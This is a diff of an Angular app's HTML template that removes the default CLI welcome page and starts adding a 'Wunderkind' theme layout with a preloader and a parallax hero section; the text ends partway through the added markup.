@@ -1,534 +1,1494 @@
-<!-- * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * -->
-<!-- * * * * * * * * * * * The content below * * * * * * * * * * * -->
-<!-- * * * * * * * * * * is only a placeholder * * * * * * * * * * -->
-<!-- * * * * * * * * * * and can be replaced. * * * * * * * * * * * -->
-<!-- * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * -->
-<!-- * * * * * * * * * Delete the template below * * * * * * * * * * -->
-<!-- * * * * * * * to get started with your project! * * * * * * * * -->
-<!-- * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * -->
-
-<style>
-  :host {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
-    font-size: 14px;
-    color: #333;
-    box-sizing: border-box;
-    -webkit-font-smoothing: antialiased;
-    -moz-osx-font-smoothing: grayscale;
-  }
-
-  h1,
-  h2,
-  h3,
-  h4,
-  h5,
-  h6 {
-    margin: 8px 0;
-  }
-
-  p {
-    margin: 0;
-  }
-
-  .spacer {
-    flex: 1;
-  }
-
-  .toolbar {
-    position: absolute;
-    top: 0;
-    left: 0;
-    right: 0;
-    height: 60px;
-    display: flex;
-    align-items: center;
-    background-color: #1976d2;
-    color: white;
-    font-weight: 600;
-  }
-
-  .toolbar img {
-    margin: 0 16px;
-  }
-
-  .toolbar #twitter-logo {
-    height: 40px;
-    margin: 0 16px;
-  }
-
-  .toolbar #twitter-logo:hover {
-    opacity: 0.8;
-  }
-
-  .content {
-    display: flex;
-    margin: 82px auto 32px;
-    padding: 0 16px;
-    max-width: 960px;
-    flex-direction: column;
-    align-items: center;
-  }
-
-  svg.material-icons {
-    height: 24px;
-    width: auto;
-  }
-
-  svg.material-icons:not(:last-child) {
-    margin-right: 8px;
-  }
-
-  .card svg.material-icons path {
-    fill: #888;
-  }
-
-  .card-container {
-    display: flex;
-    flex-wrap: wrap;
-    justify-content: center;
-    margin-top: 16px;
-  }
-
-  .card {
-    border-radius: 4px;
-    border: 1px solid #eee;
-    background-color: #fafafa;
-    height: 40px;
-    width: 200px;
-    margin: 0 8px 16px;
-    padding: 16px;
-    display: flex;
-    flex-direction: row;
-    justify-content: center;
-    align-items: center;
-    transition: all 0.2s ease-in-out;
-    line-height: 24px;
-  }
-
-  .card-container .card:not(:last-child) {
-    margin-right: 0;
-  }
-
-  .card.card-small {
-    height: 16px;
-    width: 168px;
-  }
-
-  .card-container .card:not(.highlight-card) {
-    cursor: pointer;
-  }
-
-  .card-container .card:not(.highlight-card):hover {
-    transform: translateY(-3px);
-    box-shadow: 0 4px 17px rgba(0, 0, 0, 0.35);
-  }
-
-  .card-container .card:not(.highlight-card):hover .material-icons path {
-    fill: rgb(105, 103, 103);
-  }
-
-  .card.highlight-card {
-    background-color: #1976d2;
-    color: white;
-    font-weight: 600;
-    border: none;
-    width: auto;
-    min-width: 30%;
-    position: relative;
-  }
-
-  .card.card.highlight-card span {
-    margin-left: 60px;
-  }
-
-  svg#rocket {
-    width: 80px;
-    position: absolute;
-    left: -10px;
-    top: -24px;
-  }
-
-  svg#rocket-smoke {
-    height: calc(100vh - 95px);
-    position: absolute;
-    top: 10px;
-    right: 180px;
-    z-index: -10;
-  }
-
-  a,
-  a:visited,
-  a:hover {
-    color: #1976d2;
-    text-decoration: none;
-  }
-
-  a:hover {
-    color: #125699;
-  }
-
-  .terminal {
-    position: relative;
-    width: 80%;
-    max-width: 600px;
-    border-radius: 6px;
-    padding-top: 45px;
-    margin-top: 8px;
-    overflow: hidden;
-    background-color: rgb(15, 15, 16);
-  }
-
-  .terminal::before {
-    content: "\2022 \2022 \2022";
-    position: absolute;
-    top: 0;
-    left: 0;
-    height: 4px;
-    background: rgb(58, 58, 58);
-    color: #c2c3c4;
-    width: 100%;
-    font-size: 2rem;
-    line-height: 0;
-    padding: 14px 0;
-    text-indent: 4px;
-  }
-
-  .terminal pre {
-    font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;
-    color: white;
-    padding: 0 1rem 1rem;
-    margin: 0;
-  }
-
-  .circle-link {
-    height: 40px;
-    width: 40px;
-    border-radius: 40px;
-    margin: 8px;
-    background-color: white;
-    border: 1px solid #eeeeee;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    cursor: pointer;
-    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
-    transition: 1s ease-out;
-  }
-
-  .circle-link:hover {
-    transform: translateY(-0.25rem);
-    box-shadow: 0px 3px 15px rgba(0, 0, 0, 0.2);
-  }
-
-  footer {
-    margin-top: 8px;
-    display: flex;
-    align-items: center;
-    line-height: 20px;
-  }
-
-  footer a {
-    display: flex;
-    align-items: center;
-  }
-
-  .github-star-badge {
-    color: #24292e;
-    display: flex;
-    align-items: center;
-    font-size: 12px;
-    padding: 3px 10px;
-    border: 1px solid rgba(27,31,35,.2);
-    border-radius: 3px;
-    background-image: linear-gradient(-180deg,#fafbfc,#eff3f6 90%);
-    margin-left: 4px;
-    font-weight: 600;
-    font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;
-  }
-
-  .github-star-badge:hover {
-    background-image: linear-gradient(-180deg,#f0f3f6,#e6ebf1 90%);
-    border-color: rgba(27,31,35,.35);
-    background-position: -.5em;
-  }
-
-  .github-star-badge .material-icons {
-    height: 16px;
-    width: 16px;
-    margin-right: 4px;
-  }
-
-  svg#clouds {
-    position: fixed;
-    bottom: -160px;
-    left: -230px;
-    z-index: -10;
-    width: 1920px;
-  }
-
-
-  /* Responsive Styles */
-  @media screen and (max-width: 767px) {
-
-    .card-container > *:not(.circle-link) ,
-    .terminal {
-      width: 100%;
-    }
-
-    .card:not(.highlight-card) {
-      height: 16px;
-      margin: 8px 0;
-    }
-
-    .card.highlight-card span {
-      margin-left: 72px;
-    }
-
-    svg#rocket-smoke {
-      right: 120px;
-      transform: rotate(-5deg);
-    }
-  }
-
-  @media screen and (max-width: 575px) {
-    svg#rocket-smoke {
-      display: none;
-      visibility: hidden;
-    }
-  }
-</style>
-
-<!-- Toolbar -->
-<div class="toolbar" role="banner">
-  <img
-    width="40"
-    alt="Angular Logo"
-    src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNTAgMjUwIj4KICAgIDxwYXRoIGZpbGw9IiNERDAwMzEiIGQ9Ik0xMjUgMzBMMzEuOSA2My4ybDE0LjIgMTIzLjFMMTI1IDIzMGw3OC45LTQzLjcgMTQuMi0xMjMuMXoiIC8+CiAgICA8cGF0aCBmaWxsPSIjQzMwMDJGIiBkPSJNMTI1IDMwdjIyLjItLjFWMjMwbDc4LjktNDMuNyAxNC4yLTEyMy4xTDEyNSAzMHoiIC8+CiAgICA8cGF0aCAgZmlsbD0iI0ZGRkZGRiIgZD0iTTEyNSA1Mi4xTDY2LjggMTgyLjZoMjEuN2wxMS43LTI5LjJoNDkuNGwxMS43IDI5LjJIMTgzTDEyNSA1Mi4xem0xNyA4My4zaC0zNGwxNy00MC45IDE3IDQwLjl6IiAvPgogIDwvc3ZnPg=="
-  />
-  <span>Welcome</span>
-    <div class="spacer"></div>
-    <a aria-label="Angular on twitter" target="_blank" rel="noopener" href="https://twitter.com/angular" title="Twitter">
-      <svg id="twitter-logo" height="24" data-name="Logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 400">
-        <rect width="400" height="400" fill="none"/>
-        <path d="M153.62,301.59c94.34,0,145.94-78.16,145.94-145.94,0-2.22,0-4.43-.15-6.63A104.36,104.36,0,0,0,325,122.47a102.38,102.38,0,0,1-29.46,8.07,51.47,51.47,0,0,0,22.55-28.37,102.79,102.79,0,0,1-32.57,12.45,51.34,51.34,0,0,0-87.41,46.78A145.62,145.62,0,0,1,92.4,107.81a51.33,51.33,0,0,0,15.88,68.47A50.91,50.91,0,0,1,85,169.86c0,.21,0,.43,0,.65a51.31,51.31,0,0,0,41.15,50.28,51.21,51.21,0,0,1-23.16.88,51.35,51.35,0,0,0,47.92,35.62,102.92,102.92,0,0,1-63.7,22A104.41,104.41,0,0,1,75,278.55a145.21,145.21,0,0,0,78.62,23" fill="#fff"/>
-      </svg>
-    </a>
-</div>
-
-<div class="content" role="main">
-
-  <!-- Highlight Card -->
-  <div class="card highlight-card card-small">
-
-    <svg id="rocket" alt="Rocket Ship" xmlns="http://www.w3.org/2000/svg" width="101.678" height="101.678" viewBox="0 0 101.678 101.678">
-      <g id="Group_83" data-name="Group 83" transform="translate(-141 -696)">
-        <circle id="Ellipse_8" data-name="Ellipse 8" cx="50.839" cy="50.839" r="50.839" transform="translate(141 696)" fill="#dd0031"/>
-        <g id="Group_47" data-name="Group 47" transform="translate(165.185 720.185)">
-          <path id="Path_33" data-name="Path 33" d="M3.4,42.615a3.084,3.084,0,0,0,3.553,3.553,21.419,21.419,0,0,0,12.215-6.107L9.511,30.4A21.419,21.419,0,0,0,3.4,42.615Z" transform="translate(0.371 3.363)" fill="#fff"/>
-          <path id="Path_34" data-name="Path 34" d="M53.3,3.221A3.09,3.09,0,0,0,50.081,0,48.227,48.227,0,0,0,18.322,13.437c-6-1.666-14.991-1.221-18.322,7.218A33.892,33.892,0,0,1,9.439,25.1l-.333.666a3.013,3.013,0,0,0,.555,3.553L23.985,43.641a2.9,2.9,0,0,0,3.553.555l.666-.333A33.892,33.892,0,0,1,32.647,53.3c8.55-3.664,8.884-12.326,7.218-18.322A48.227,48.227,0,0,0,53.3,3.221ZM34.424,9.772a6.439,6.439,0,1,1,9.106,9.106,6.368,6.368,0,0,1-9.106,0A6.467,6.467,0,0,1,34.424,9.772Z" transform="translate(0 0.005)" fill="#fff"/>
-        </g>
-      </g>
-    </svg>
-
-    <span>{{ title }} app is running!</span>
-
-    <svg id="rocket-smoke" alt="Rocket Ship Smoke" xmlns="http://www.w3.org/2000/svg" width="516.119" height="1083.632" viewBox="0 0 516.119 1083.632">
-      <path id="Path_40" data-name="Path 40" d="M644.6,141S143.02,215.537,147.049,870.207s342.774,201.755,342.774,201.755S404.659,847.213,388.815,762.2c-27.116-145.51-11.551-384.124,271.9-609.1C671.15,139.365,644.6,141,644.6,141Z" transform="translate(-147.025 -140.939)" fill="#f5f5f5"/>
-    </svg>
-
-  </div>
-
-  <!-- Resources -->
-  <h2>Resources</h2>
-  <p>Here are some links to help you get started:</p>
-
-  <div class="card-container">
-    <a class="card" target="_blank" rel="noopener" href="https://angular.io/tutorial">
-      <svg class="material-icons" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82zM12 3L1 9l11 6 9-4.91V17h2V9L12 3z"/></svg>
-
-      <span>Learn Angular</span>
-
-      <svg class="material-icons" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>    </a>
-
-    <a class="card" target="_blank" rel="noopener" href="https://angular.io/cli">
-      <svg class="material-icons" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z"/></svg>
-
-      <span>CLI Documentation</span>
-
-      <svg class="material-icons" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>
-    </a>
-
-    <a class="card" target="_blank" rel="noopener" href="https://blog.angular.io/">
-      <svg class="material-icons" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M13.5.67s.74 2.65.74 4.8c0 2.06-1.35 3.73-3.41 3.73-2.07 0-3.63-1.67-3.63-3.73l.03-.36C5.21 7.51 4 10.62 4 14c0 4.42 3.58 8 8 8s8-3.58 8-8C20 8.61 17.41 3.8 13.5.67zM11.71 19c-1.78 0-3.22-1.4-3.22-3.14 0-1.62 1.05-2.76 2.81-3.12 1.77-.36 3.6-1.21 4.62-2.58.39 1.29.59 2.65.59 4.04 0 2.65-2.15 4.8-4.8 4.8z"/></svg>
-
-      <span>Angular Blog</span>
-
-      <svg class="material-icons" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>
-    </a>
-
-  </div>
-
-  <!-- Next Steps -->
-  <h2>Next Steps</h2>
-  <p>What do you want to do next with your app?</p>
-
-  <input type="hidden" #selection>
-
-  <div class="card-container">
-    <div class="card card-small" (click)="selection.value = 'component'" tabindex="0">
-        <svg class="material-icons" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
-
-      <span>New Component</span>
-    </div>
-
-    <div class="card card-small" (click)="selection.value = 'material'" tabindex="0">
-        <svg class="material-icons" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
-
-      <span>Angular Material</span>
-    </div>
-
-    <div class="card card-small" (click)="selection.value = 'pwa'" tabindex="0">
-        <svg class="material-icons" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
-
-      <span>Add PWA Support</span>
-    </div>
-
-    <div class="card card-small" (click)="selection.value = 'dependency'" tabindex="0">
-      <svg class="material-icons" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
-
-      <span>Add Dependency</span>
-    </div>
-
-    <div class="card card-small" (click)="selection.value = 'test'" tabindex="0">
-      <svg class="material-icons" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
-
-      <span>Run and Watch Tests</span>
-    </div>
-
-    <div class="card card-small" (click)="selection.value = 'build'" tabindex="0">
-      <svg class="material-icons" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
-
-      <span>Build for Production</span>
-    </div>
-  </div>
-
-  <!-- Terminal -->
-  <div class="terminal" [ngSwitch]="selection.value">
-      <pre *ngSwitchDefault>ng generate component xyz</pre>
-      <pre *ngSwitchCase="'material'">ng add @angular/material</pre>
-      <pre *ngSwitchCase="'pwa'">ng add @angular/pwa</pre>
-      <pre *ngSwitchCase="'dependency'">ng add _____</pre>
-      <pre *ngSwitchCase="'test'">ng test</pre>
-      <pre *ngSwitchCase="'build'">ng build --prod</pre>
-  </div>
-
-  <!-- Links -->
-  <div class="card-container">
-    <a class="circle-link" title="Animations" href="https://angular.io/guide/animations" target="_blank" rel="noopener">
-      <svg id="Group_20" data-name="Group 20" xmlns="http://www.w3.org/2000/svg" width="21.813" height="23.453" viewBox="0 0 21.813 23.453">
-        <path id="Path_15" data-name="Path 15" d="M4099.584,972.736h0l-10.882,3.9,1.637,14.4,9.245,5.153,9.245-5.153,1.686-14.4Z" transform="translate(-4088.702 -972.736)" fill="#ffa726"/>
-        <path id="Path_16" data-name="Path 16" d="M4181.516,972.736v23.453l9.245-5.153,1.686-14.4Z" transform="translate(-4170.633 -972.736)" fill="#fb8c00"/>
-        <path id="Path_17" data-name="Path 17" d="M4137.529,1076.127l-7.7-3.723,4.417-2.721,7.753,3.723Z" transform="translate(-4125.003 -1058.315)" fill="#ffe0b2"/>
-        <path id="Path_18" data-name="Path 18" d="M4137.529,1051.705l-7.7-3.723,4.417-2.721,7.753,3.723Z" transform="translate(-4125.003 -1036.757)" fill="#fff3e0"/>
-        <path id="Path_19" data-name="Path 19" d="M4137.529,1027.283l-7.7-3.723,4.417-2.721,7.753,3.723Z" transform="translate(-4125.003 -1015.199)" fill="#fff"/>
-      </svg>
-    </a>
-
-    <a class="circle-link" title="CLI" href="https://cli.angular.io/" target="_blank" rel="noopener">
-      <svg alt="Angular CLI Logo" xmlns="http://www.w3.org/2000/svg" width="21.762" height="23.447" viewBox="0 0 21.762 23.447">
-        <g id="Group_21" data-name="Group 21" transform="translate(0)">
-          <path id="Path_20" data-name="Path 20" d="M2660.313,313.618h0l-10.833,3.9,1.637,14.4,9.2,5.152,9.244-5.152,1.685-14.4Z" transform="translate(-2649.48 -313.618)" fill="#37474f"/>
-          <path id="Path_21" data-name="Path 21" d="M2741.883,313.618v23.447l9.244-5.152,1.685-14.4Z" transform="translate(-2731.05 -313.618)" fill="#263238"/>
-          <path id="Path_22" data-name="Path 22" d="M2692.293,379.169h11.724V368.618h-11.724Zm11.159-.6h-10.608v-9.345h10.621v9.345Z" transform="translate(-2687.274 -362.17)" fill="#fff"/>
-          <path id="Path_23" data-name="Path 23" d="M2709.331,393.688l.4.416,2.265-2.28-2.294-2.294-.4.4,1.893,1.893Z" transform="translate(-2702.289 -380.631)" fill="#fff"/>
-          <rect id="Rectangle_12" data-name="Rectangle 12" width="3.517" height="0.469" transform="translate(9.709 13.744)" fill="#fff"/>
-        </g>
-      </svg>
-    </a>
-
-    <a class="circle-link" title="Augury" href="https://augury.rangle.io/" target="_blank" rel="noopener">
-      <svg alt="Angular Augury Logo" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="21.81" height="23.447" viewBox="0 0 21.81 23.447">
-        <defs>
-          <clipPath id="clip-path">
-            <rect id="Rectangle_13" data-name="Rectangle 13" width="10.338" height="10.27" fill="none"/>
-          </clipPath>
-        </defs>
-        <g id="Group_25" data-name="Group 25" transform="translate(0)">
-          <path id="Path_24" data-name="Path 24" d="M3780.155,311.417h0l-10.881,3.9,1.637,14.4,9.244,5.152,9.244-5.152,1.685-14.4Z" transform="translate(-3769.274 -311.417)" fill="#4a3493"/>
-          <path id="Path_25" data-name="Path 25" d="M3862.088,311.417v23.447l9.244-5.152,1.685-14.4Z" transform="translate(-3851.207 -311.417)" fill="#311b92"/>
-          <g id="Group_24" data-name="Group 24" transform="translate(6.194 6.73)" opacity="0.5">
-            <g id="Group_23" data-name="Group 23" transform="translate(0 0)">
-              <g id="Group_22" data-name="Group 22" clip-path="url(#clip-path)">
-                <path id="Path_26" data-name="Path 26" d="M3832.4,373.252a5.168,5.168,0,1,1-5.828-4.383,5.216,5.216,0,0,1,2.574.3,3.017,3.017,0,1,0,3.252,4.086Z" transform="translate(-3822.107 -368.821)" fill="#fff"/>
-              </g>
-            </g>
-          </g>
-          <path id="Path_27" data-name="Path 27" d="M3830.582,370.848a5.162,5.162,0,1,1-3.254-4.086,3.017,3.017,0,1,0,3.252,4.086Z" transform="translate(-3814.311 -359.969)" fill="#fff"/>
-        </g>
-      </svg>
-    </a>
-
-    <a class="circle-link" title="Protractor" href="https://www.protractortest.org/" target="_blank" rel="noopener">
-      <svg alt="Angular Protractor Logo" xmlns="http://www.w3.org/2000/svg" width="21.81" height="23.447" viewBox="0 0 21.81 23.447">
-        <g id="Group_26" data-name="Group 26" transform="translate(0)">
-          <path id="Path_28" data-name="Path 28" d="M4620.155,311.417h0l-10.881,3.9,1.637,14.4,9.244,5.152,9.244-5.152,1.685-14.4Z" transform="translate(-4609.274 -311.417)" fill="#e13439"/>
-          <path id="Path_29" data-name="Path 29" d="M4702.088,311.417v23.447l9.244-5.152,1.685-14.4Z" transform="translate(-4691.207 -311.417)" fill="#b52f32"/>
-          <path id="Path_30" data-name="Path 30" d="M4651.044,369.58v-.421h1.483a7.6,7.6,0,0,0-2.106-5.052l-1.123,1.123-.3-.3,1.122-1.121a7.588,7.588,0,0,0-4.946-2.055v1.482h-.421v-1.485a7.589,7.589,0,0,0-5.051,2.058l1.122,1.121-.3.3-1.123-1.123a7.591,7.591,0,0,0-2.106,5.052h1.482v.421h-1.489v1.734h15.241V369.58Zm-10.966-.263a4.835,4.835,0,0,1,9.67,0Z" transform="translate(-4634.008 -355.852)" fill="#fff"/>
-        </g>
-      </svg>
-    </a>
-
-    <a class="circle-link" title="Find a Local Meetup" href="https://www.meetup.com/find/?keywords=angular" target="_blank" rel="noopener">
-      <svg alt="Meetup Logo" xmlns="http://www.w3.org/2000/svg" width="24.607" height="23.447" viewBox="0 0 24.607 23.447">
-        <path id="logo--mSwarm" d="M21.221,14.95A4.393,4.393,0,0,1,17.6,19.281a4.452,4.452,0,0,1-.8.069c-.09,0-.125.035-.154.117a2.939,2.939,0,0,1-2.506,2.091,2.868,2.868,0,0,1-2.248-.624.168.168,0,0,0-.245-.005,3.926,3.926,0,0,1-2.589.741,4.015,4.015,0,0,1-3.7-3.347,2.7,2.7,0,0,1-.043-.38c0-.106-.042-.146-.143-.166a3.524,3.524,0,0,1-1.516-.69A3.623,3.623,0,0,1,2.23,14.557a3.66,3.66,0,0,1,1.077-3.085.138.138,0,0,0,.026-.2,3.348,3.348,0,0,1-.451-1.821,3.46,3.46,0,0,1,2.749-3.28.44.44,0,0,0,.355-.281,5.072,5.072,0,0,1,3.863-3,5.028,5.028,0,0,1,3.555.666.31.31,0,0,0,.271.03A4.5,4.5,0,0,1,18.3,4.7a4.4,4.4,0,0,1,1.334,2.751,3.658,3.658,0,0,1,.022.706.131.131,0,0,0,.1.157,2.432,2.432,0,0,1,1.574,1.645,2.464,2.464,0,0,1-.7,2.616c-.065.064-.051.1-.014.166A4.321,4.321,0,0,1,21.221,14.95ZM13.4,14.607a2.09,2.09,0,0,0,1.409,1.982,4.7,4.7,0,0,0,1.275.221,1.807,1.807,0,0,0,.9-.151.542.542,0,0,0,.321-.545.558.558,0,0,0-.359-.534,1.2,1.2,0,0,0-.254-.078c-.262-.047-.526-.086-.787-.138a.674.674,0,0,1-.617-.75,3.394,3.394,0,0,1,.218-1.109c.217-.658.509-1.286.79-1.918a15.609,15.609,0,0,0,.745-1.86,1.95,1.95,0,0,0,.06-1.073,1.286,1.286,0,0,0-1.051-1.033,1.977,1.977,0,0,0-1.521.2.339.339,0,0,1-.446-.042c-.1-.092-.2-.189-.307-.284a1.214,1.214,0,0,0-1.643-.061,7.563,7.563,0,0,1-.614.512A.588.588,0,0,1,10.883,8c-.215-.115-.437-.215-.659-.316a2.153,2.153,0,0,0-.695-.248A2.091,2.091,0,0,0,7.541,8.562a9.915,9.915,0,0,0-.405.986c-.559,1.545-1.015,3.123-1.487,4.7a1.528,1.528,0,0,0,.634,1.777,1.755,1.755,0,0,0,1.5.211,1.35,1.35,0,0,0,.824-.858c.543-1.281,1.032-2.584,1.55-3.875.142-.355.28-.712.432-1.064a.548.548,0,0,1,.851-.24.622.622,0,0,1,.185.539,2.161,2.161,0,0,1-.181.621c-.337.852-.68,1.7-1.018,2.552a2.564,2.564,0,0,0-.173.528.624.624,0,0,0,.333.71,1.073,1.073,0,0,0,.814.034,1.22,1.22,0,0,0,.657-.655q.758-1.488,1.511-2.978.35-.687.709-1.37a1.073,1.073,0,0,1,.357-.434.43.43,0,0,1,.463-.016.373.373,0,0,1,.153.387.7.7,0,0,1-.057.236c-.065.157-.127.316-.2.469-.42.883-.846,1.763-1.262,2.648A2.463,2.463,0,0,0,13.4,14.607Zm5.888,6.508a1.09,1.09,0,0,0-2.179.006,1.09,1.09,0,0,0,2.179-.006ZM1.028,12.139a1.038,1.038,0,1,0,.01-2.075,1.038,1.038,0,0,0-.01,2.075ZM13.782.528a1.027,1.027,0,1,0-.011,2.055A1.027,1.027,0,0,0,13.782.528ZM22.21,6.95a.882.882,0,0,0-1.763.011A.882.882,0,0,0,22.21,6.95ZM4.153,4.439a.785.785,0,1,0,.787-.78A.766.766,0,0,0,4.153,4.439Zm8.221,18.22a.676.676,0,1,0-.677.666A.671.671,0,0,0,12.374,22.658ZM22.872,12.2a.674.674,0,0,0-.665.665.656.656,0,0,0,.655.643.634.634,0,0,0,.655-.644A.654.654,0,0,0,22.872,12.2ZM7.171-.123A.546.546,0,0,0,6.613.43a.553.553,0,1,0,1.106,0A.539.539,0,0,0,7.171-.123ZM24.119,9.234a.507.507,0,0,0-.493.488.494.494,0,0,0,.494.494.48.48,0,0,0,.487-.483A.491.491,0,0,0,24.119,9.234Zm-19.454,9.7a.5.5,0,0,0-.488-.488.491.491,0,0,0-.487.5.483.483,0,0,0,.491.479A.49.49,0,0,0,4.665,18.936Z" transform="translate(0 0.123)" fill="#f64060"/>
-      </svg>
-    </a>
-
-    <a class="circle-link" title="Join the Conversation on Gitter" href="https://gitter.im/angular/angular" target="_blank" rel="noopener">
-      <svg alt="Gitter Logo" xmlns="http://www.w3.org/2000/svg" width="19.447" height="19.447" viewBox="0 0 19.447 19.447">
-        <g id="Group_40" data-name="Group 40" transform="translate(-1612 -405)">
-          <rect id="Rectangle_19" data-name="Rectangle 19" width="19.447" height="19.447" transform="translate(1612 405)" fill="#e60257"/>
-          <g id="gitter" transform="translate(1617.795 408.636)">
-            <g id="Group_33" data-name="Group 33" transform="translate(0 0)">
-              <rect id="Rectangle_15" data-name="Rectangle 15" width="1.04" height="9.601" transform="translate(2.304 2.324)" fill="#fff"/>
-              <rect id="Rectangle_16" data-name="Rectangle 16" width="1.04" height="9.601" transform="translate(4.607 2.324)" fill="#fff"/>
-              <rect id="Rectangle_17" data-name="Rectangle 17" width="1.04" height="4.648" transform="translate(6.91 2.324)" fill="#fff"/>
-              <rect id="Rectangle_18" data-name="Rectangle 18" width="1.04" height="6.971" transform="translate(0 0)" fill="#fff"/>
-            </g>
-          </g>
-        </g>
-      </svg>
-    </a>
-  </div>
-
-  <!-- Footer -->
-  <footer>
-      Love Angular?&nbsp;
-      <a href="https://github.com/angular/angular" target="_blank" rel="noopener"> Give our repo a star.
-        <div class="github-star-badge">
-            <svg class="material-icons" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
-          Star
+<body class="html front not-logged-in no-sidebars page-home page-home-parallax-background" data-target="#main-nav"
+    data-spy="scroll" data-offset="200" data-spy="scroll" data-target="#main-nav">
+
+    <div id="preloader">
+        <div class="preloader-container">
+            <h4 class="preload-logo wow fadeInLeft">
+                Wunderkind </h4>
+            <h4 class="back-logo wow fadeInRight">Wunderkind</h4>
+            <img src="../assets/sites/all/themes/wunderkind/img/preload.gif" class="preload-gif wow fadeInUp" alt="">
         </div>
-      </a>
-      <a href="https://github.com/angular/angular" target="_blank" rel="noopener">
-        <svg class="material-icons" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" fill="#1976d2"/><path d="M0 0h24v24H0z" fill="none"/></svg>
-      </a>
-  </footer>
+    </div>
 
-  <svg id="clouds" alt="Gray Clouds Background" xmlns="http://www.w3.org/2000/svg" width="2611.084" height="485.677" viewBox="0 0 2611.084 485.677">
-    <path id="Path_39" data-name="Path 39" d="M2379.709,863.793c10-93-77-171-168-149-52-114-225-105-264,15-75,3-140,59-152,133-30,2.83-66.725,9.829-93.5,26.25-26.771-16.421-63.5-23.42-93.5-26.25-12-74-77-130-152-133-39-120-212-129-264-15-54.084-13.075-106.753,9.173-138.488,48.9-31.734-39.726-84.4-61.974-138.487-48.9-52-114-225-105-264,15a162.027,162.027,0,0,0-103.147,43.044c-30.633-45.365-87.1-72.091-145.206-58.044-52-114-225-105-264,15-75,3-140,59-152,133-53,5-127,23-130,83-2,42,35,72,70,86,49,20,106,18,157,5a165.625,165.625,0,0,0,120,0c47,94,178,113,251,33,61.112,8.015,113.854-5.72,150.492-29.764a165.62,165.62,0,0,0,110.861-3.236c47,94,178,113,251,33,31.385,4.116,60.563,2.495,86.487-3.311,25.924,5.806,55.1,7.427,86.488,3.311,73,80,204,61,251-33a165.625,165.625,0,0,0,120,0c51,13,108,15,157-5a147.188,147.188,0,0,0,33.5-18.694,147.217,147.217,0,0,0,33.5,18.694c49,20,106,18,157,5a165.625,165.625,0,0,0,120,0c47,94,178,113,251,33C2446.709,1093.793,2554.709,922.793,2379.709,863.793Z" transform="translate(142.69 -634.312)" fill="#eee"/>
-  </svg>
+    <div class="site-wrapper">
+        <div class="nd-region no-padding">
 
-</div>
-
-<!-- * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * -->
-<!-- * * * * * * * * * * * The content above * * * * * * * * * * * -->
-<!-- * * * * * * * * * * is only a placeholder * * * * * * * * * * -->
-<!-- * * * * * * * * * * and can be replaced. * * * * * * * * * * * -->
-<!-- * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * -->
-<!-- * * * * * * * * * * End of Placeholder * * * * * * * * * * * -->
-<!-- * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * -->
+            <div class="container-fluid">
+                <div id="Home" class="row">
+                    <div id="top" class="col-md-12 ">
+                        <div class="region region-top">
+                            <div id="block-block-1" class="block block-block">
 
 
+                                <section id="home" class="full-height" data-stellar-background-ratio="0.6"
+                                    style="background-image: url('../assets/sites/wunderkind.nikadevs.com/files/bg_1.jpg');">
+                                    <div class="parallax-overlay"></div>
